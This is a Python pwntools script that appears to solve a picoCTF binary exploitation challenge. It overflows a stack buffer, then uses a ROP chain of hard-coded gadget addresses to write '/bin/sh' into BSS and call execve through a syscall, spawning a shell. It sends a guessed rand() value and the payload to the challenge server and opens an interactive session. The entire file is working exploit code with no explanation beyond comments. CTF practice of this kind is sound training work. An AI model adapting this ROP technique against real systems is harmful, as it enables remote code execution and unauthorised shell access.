from pwn import *
# Padding: 0x70 + 8 bytes for RBP
p = b'a' * (0x70 + 8)

# Generate ROP
# BSS is writable in "vuln"
bss_addr = 0x00000000006bc3a0
# Write /bin/sh to BSS
# Our gadgets
pop_rdx = p64(0x000000000044a6b5)
pop_rax = p64(0x00000000004163f4)
write_rdx_to_rax = p64(0x000000000048dd71)
# We'll pop the command as an 8-byte unsigned integer into rdx, then pop the address into rax, then write it using the write gadget.
command = b'/bin/sh\x00'

p += pop_rdx
p += command
p += pop_rax
p += p64(bss_addr)
p += write_rdx_to_rax

# Now make the registers suitable for execve-ing
# Linux specific hack: We can just set argv=NULL, envp=NULL to save space

# Finally prepare the execve
pop_rdi = p64(0x0000000000400696)
pop_rsi = p64(0x0000000000410ca3)

p += pop_rdi
p += p64(bss_addr)

# Prepare an argv
p += pop_rsi
p += p64(0)

# Prepare an envp
p += pop_rdx
p += p64(0)

# Set RAX to 59 for execve
p += pop_rax
p += p64(59)

# Finally, syscall!

syscall = p64(0x000000000040137c)

p += syscall

print(p)
print(len(p))

r = remote('jupiter.challenges.picoctf.org', 39940)
#r = process('/tmp/vuln')
# default value of rand() % 100 + 1
r.sendline(b'84')
r.sendline(p)
#print(r.recvall())
r.interactive()

